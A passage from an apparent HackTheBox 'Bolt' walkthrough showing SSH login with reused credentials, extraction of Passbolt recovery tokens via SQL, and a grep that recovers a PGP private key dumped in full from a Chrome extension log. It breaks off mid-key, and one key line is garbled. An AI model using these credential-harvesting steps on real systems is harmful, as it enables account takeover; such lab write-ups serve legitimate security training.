WXg5He2wHt4QYHuyGET - rT2;jW7&lt;eY8!dX8}pQ8%\nTesting for password reuse on our two users, Eddie and Clark, reveals a matching set of credentials!\neddie:rT2;jW7&lt;eY8!dX8}pQ8%\n\n\n\nStep 7\nLogin and grab user.txt\n┌──(void㉿void)-[/htb/bolt]\n└─$ ssh eddie@bolt.htb                                                             \neddie@bolt.htb's password: jW7&lt;eY8!dX8}pQ8%\n\neddie@bolt:~$ id && hostname\nuid=1000(eddie) gid=1000(eddie) groups=1000(eddie)\nbolt.htb\neddie@bolt:~$ cat user.txt \nc62e3df13f90e4aebff46002be1a088f\n\n\n\n\nRoot\n\nStep 1\nsudo -l fails because we don’t have sudo password. As we remember from a while back, user Eddie have a mail, lets start by looking at that.\neddie@bolt:~$ cat /var/mail/eddie \nFrom clark@bolt.htb  Thu Feb 25 14:20:19 2021\nReturn-Path: &lt;clark@bolt.htb&gt;\nX-Original-To: eddie@bolt.htb\nDelivered-To: eddie@bolt.htb\nReceived: by bolt.htb (Postfix, from userid 1001)\n    id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nSubject: Important!\nTo: &lt;eddie@bolt.htb&gt;\nX-Mailer: mail (GNU Mailutils 3.7)\nMessage-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;\nDate: Thu, 25 Feb 2021 14:20:19 -0700 (MST)\nFrom: Clark Griswold &lt;clark@bolt.htb&gt;\n\nHey Eddie,\n\nThe password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.\nOnce you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...\n\n-Clark\nPassbolt is a Open Source Password Manager, and from scouring the database we found both Clark and Eddies PGP Public key and some passwords.\nWhile looking for ways to recover Clark and Eddie’s accounts I came across this post. We extract the token and user_id from mysql and use it to access the recovery page. https://&lt;your_domain&gt;/setup/recover/&lt;user_id&gt;/&lt;token&gt;\nClark:\nmysql&gt; select user_id, token from authentication_tokens where user_id = (select id from users where username = 'clark@bolt.htb') and type = 'recover' order by\n created DESC;\n+--------------------------------------+--------------------------------------+\n| user_id                              | token                                |\n+--------------------------------------+--------------------------------------+\n| 9d8a0452-53dc-4640-b3a7-9a3d86b0ff90 | 1893cd40-fae5-4dd9-9406-947620fdac66 |\n+--------------------------------------+--------------------------------------+\nEddie:\nmysql&gt; select user_id, token from authentication_tokens where user_id = (select id from users where username = 'eddie@bolt.htb') and type = 'recover' order by created DESC;\n+--------------------------------------+--------------------------------------+\n| user_id                              | token                                |\n+--------------------------------------+--------------------------------------+\n| 4e184ee6-e436-47fb-91c9-dccb57f250bc | cf880afd-d905-482e-84e0-42469662769c |\n| 4e184ee6-e436-47fb-91c9-dccb57f250bc | 629845af-e964-4ef8-b7bf-68b921d013cf |\n+--------------------------------------+--------------------------------------+\nAccess the recovery page and we quicky realize we need to supply a private key, something that we’ve yet to discover.\n![[Pasted image 20211112092547.png]]\n\n\n\nStep 2\nA quick grep for a BEGIN PGP PRIVATE and we find an interesting log-file.\neddie@bolt:~$ grep -iR \"BEGIN PGP PRIVATE\"\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK\n.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push(\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\r\\n\");\nBinary file .config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches\nList the content of the file with strings and beautifying the json-data we get:\n{\n   \"config\":{\n      \"log\":{\n         \"console\":false,\n         \"level\":0\n      },\n      \"user.firstname\":\"Eddie\",\n      \"user.id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\",\n      \"user.lastname\":\"Johnson\",\n      \"user.settings.securityToken.code\":\"GOZ\",\n      \"user.settings.securityToken.color\":\"#607d8b\",\n      \"user.settings.securityToken.textColor\":\"#ffffff\",\n      \"user.settings.trustedDomain\":\"https://passbolt.bolt.htb\",\n      \"user.username\":\"eddie@bolt.htb\"\n   },\n   \"passbolt-private-gpgkeys\":\"{\\\"MY_KEY_ID\\\":{\\\"key\\\":\\\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\n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\\\\r\\\\nJ6V/kusDdyek7yhT1dXVkZZQSeCUU��g�@�cQXO4ocMQDcj6kDLW58tV/WQKJ3duRt\\\\r\\\\n1VrD5poP49+OynR55rXtzi7skOM+0o2tcqy3JppM3egvYvXlpzXggC5b1NvS\\\\r\\\\nUCUqIkrGQRr7VTk/jwkbFt1zuWp5s8zEGV7aXbNI4cSKDsowGuTFb7cBCDGU\\\\r\\\\nNsw+14+EGQp5TrvCwHYEGAEIAAkFAmA4G2ECGwwAIQkQHCdBo9w7Sr0WIQTf\\\\r\\\\nQmvHpKivWOUO2g4cJ0Gj3DtKvf4dB/9CGuPrOfIaQtuP25S/RLVDl8XHvzPm\\\\r\\\\noRdF7iu8ULcA9gTxPn8DNbtdZEnFHHOANAHnIFGgYS4vj3Dj9Q3CEZSSVvwg\\\\r\\\\n6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\\\r\\\\nIc3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\\\r\\\\n11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\\\r\\\\nYZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\\\r\\\\nPSwYYWlAywj5\\\\r\\\\n=cqxZ\\\\r\\\\n-----END PGP PRIVATE KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"dc3b4abd\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Eddie Johnson\\\",\\\"email\\\":\\\"eddie@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\\\",\\\"created\\\":\\\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":2048,\\\"private\\\":true,\\\"user_id\\\":\\\"MY_KEY_ID\\\"}}\",\n   \"passbolt-public-gpgkeys\":\"{\\\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\\\":{\\\"key\\\":\\\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\n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\\\\r\\\\n=FBUR\\\\r\\\\n-----END PGP PUBLIC KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"56a16c84\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Passbolt Server Key\\\",\\\"email\\\":\\\"admin@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"59860a269e803fa094416753ab8e2efb56a16c84\\\",\\\"created\\\":\\\"Wed Feb 24 2021 12:15:49 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":3072,\\\"private\\\":false,\\\"user_id\\\":\\\"ba192ac8-99c0-3c89-a36f-a6094f5b9391\\\"},\\\"4e184ee6-e436-47fb-91c9-dccb57f250bc\\\":{\\\"key\\\":\\\"-----BEGIN PGP PUBLIC KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\nxsBNBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\\\r\\\\nfjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\\\r\\\\ncpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\\\r\\\\nRNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\\\r\\\\n+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\\\r\\\\nIf70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\\\r\\\\nAAHNHkVkZGllIEpvaG5zb24gPGVkZGllQGJvbHQuaHRiPsLAjQQQAQgAIAUC\\\\r\\\\nYDgbYQYLCQcIAwIEFQgKAgQWAgEAAhkBAhsDAh4BACEJEBwnQaPcO0q9FiEE\\\\r\\\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr35DQf9HZOFYE3yug2TuEJY7q9QfwNrWhfJ\\\\r\\\\nHmOwdM1kCKV5XnBic356DF/ViT3+pcWfIbWT8giYIZ/2qYfAd74S+gMKBim8\\\\r\\\\nwBAH0J7WcnUI+py/zXxapGxBF0ufJtqrHmPaKsNaQVCEV3dDzTqlVRi0vfOD\\\\r\\\\nCm6kt3E8f8GPYK9Mh21gPjnhoPE1s23NzmBUiDt6wjZ2dOQ2cVagVnf6PyHM\\\\r\\\\nWZLqUm8nQY342t3+AA6SFTw/YpwPPvjtZBBHf95BrSbpCE5Bjar9UyB+14x6\\\\r\\\\nOUcWhkJu7QgySrCwAg2aKIBzsfWovcVTe9Rkpq/ty1tYOklT9kn75D9ttDF4\\\\r\\\\nU8+Qz61kTICf987ATQRgOBthAQgAmlgcw3DqVzEBa5k9djPsUTJWOKVY5uox\\\\r\\\\noBp6X0H9njR9Ufb2XtmxZUUdV/uhtbnM0lSlNkeNNBX4c/Qny88vfkgb66xc\\\\r\\\\noOo4q+fNCEZfCmcS2AwMsUlzaPDQjowp4V+mWSc8JXq4GXOd/mrooibtiEdt\\\\r\\\\nvK4pzMdvwGCykFqugyRDLksc1hfDYU+s5R42TNiMdW7OwYAplnOjgExOH8f1\\\\r\\\\nlXVkqbsq5p54TbHe+0SdlfH5pJf4Gfwqj6dQlkSf3DMeEnByxEZX3imeKGrC\\\\r\\\\nUmwLN4NHMeUs5EXuLnufut9aTMhbw/tetTtUXTHFk/zc7EhZDR1d3mkDV83c\\\\r\\\\ntEUh6BuElwARAQABwsB2BBgBCAAJBQJgOBthAhsMACEJEBwnQaPcO0q9FiEE\\\\r\\\\n30Jrx6Sor1jlDtoOHCdBo9w7Sr3+HQf/Qhrj6znyGkLbj9uUv0S1Q5fFx78z\\\\r\\\\n5qEXRe4rvFC3APYE8T5/AzW7XWRJxRxzgDQB5yBRoGEuL49w4/UNwhGUklb8\\\\r\\\\nIOuffRTHMPZxs8qVToKoEL/CRpiFHgoqQ9dJPJx1u5vWAX0AdOMvcCcPfVjc\\\\r\\\\nPyHN73YWejb7Ji82CNtXZ1g9vO7D49rSgLoSNAKghJIkcG+GeAkhoCeU4BjC\\\\r\\\\n/NdSM65Kmps6XOpigRottd7WB+sXpd5wyb+UyptwBsF7AISYycPvStDDQESg\\\\r\\\\npmGRRi3bQP6jGo1uP/k9wye/WMD0DrQqxch4lqCDk1n7OFIYlCSBOHU0rE/1\\\\r\\\\ntD0sGGFpQMsI+Q==\\\\r\\\\n=+pbw\\\\r\\\\n-----END PGP PUBLIC KEY BLOCK-----\\\\r\\\\n\\\",\\\"keyId\\\":\\\"dc3b4abd\\\",\\\"userIds\\\":[{\\\"name\\\":\\\"Eddie Johnson\\\",\\\"email\\\":\\\"eddie@bolt.htb\\\"}],\\\"fingerprint\\\":\\\"df426bc7a4a8af58e50eda0e1c2741a3dc3b4abd\\\",\\\"created\\\":\\\"Thu Feb 25 2021 14:49:21 GMT-0700 (Mountain Standard Time)\\\",\\\"expires\\\":\\\"Never\\\",\\\"algorithm\\\":\\\"rsa_encrypt_sign\\\",\\\"length\\\":2048,\\\"private\\\":false,\\\"user_id\\\":\\\"4e184ee6-e436-47fb-91c9-dccb57f250bc\\\"}}\"\n}\n\n{\n   \"config\":{\n      \"user.firstname\":\"Eddie\",\n      \"user.id\":\"4e184ee6-e436-47fb-91c9-dccb57f250bc\",\n      \"user.lastname\":\"Johnson\",\n      \"user.settings.securityToken.code\":\"GOZ\",\n      \"user.settings.securityToken.color\":\"#607d8b\",\n      \"user.settings.securityToken.textColor\":\"#ffffff\",\n      \"user.settings.trustedDomain\":\"https://passbolt.bolt.htb\",\n      \"user.username\":\"eddie@bolt.htb\"\n   },\n   \"passbolt-private-gpgkeys\":\"{\\\"MY_KEY_ID\\\":{\\\"key\\\":\\\"-----BEGIN PGP PRIVATE KEY BLOCK-----\\\\r\\\\nVersion: OpenPGP.js v4.10.9\\\\r\\\\nComment: https://openpgpjs.org\\\\r\\\\n\\\\r\\\\n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